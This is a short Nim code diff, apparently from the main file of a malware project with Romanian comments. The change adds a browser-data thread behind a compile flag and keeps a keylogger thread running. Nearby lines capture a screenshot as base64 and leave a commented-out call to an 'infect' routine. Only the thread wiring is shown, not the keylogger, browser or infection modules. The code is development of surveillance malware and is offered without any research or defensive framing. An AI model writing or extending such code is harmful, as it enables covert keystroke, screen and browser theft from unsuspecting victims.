@@ -7,6 +7,8 @@ import lib/functions/screenshot
 
 from lib/channels import mainThread
 
+from lib/flags import USE_BROWSER_THREAD
+
 # am pus asta doar ca sa testez func
 # import lib/functions/infect
 # infect()
@@ -22,13 +24,18 @@ let base64Ss: string = screenshot()
 
 # writeFile("base64.tmp.txt", base64Ss)
 
-## TODO: CODE CLEANUP
-## TODO: COMUNICARE INTRE THREADURI
-var thr: Thread[void]
-
 open mainThread
 
-createThread(thr, initKeyloggerThread)
+## TODO: CODE CLEANUP
+var keyloggerThreadVar: Thread[void]
+
+when USE_BROWSER_THREAD:
+  from lib/threads/browserThread import initBrowserThread
+  var browserThreadVar: Thread[void]
+  createThread(browserThreadVar, initBrowserThread)
+
+
+createThread(keyloggerThreadVar, initKeyloggerThread)
 
 while true:
   ## TODO:
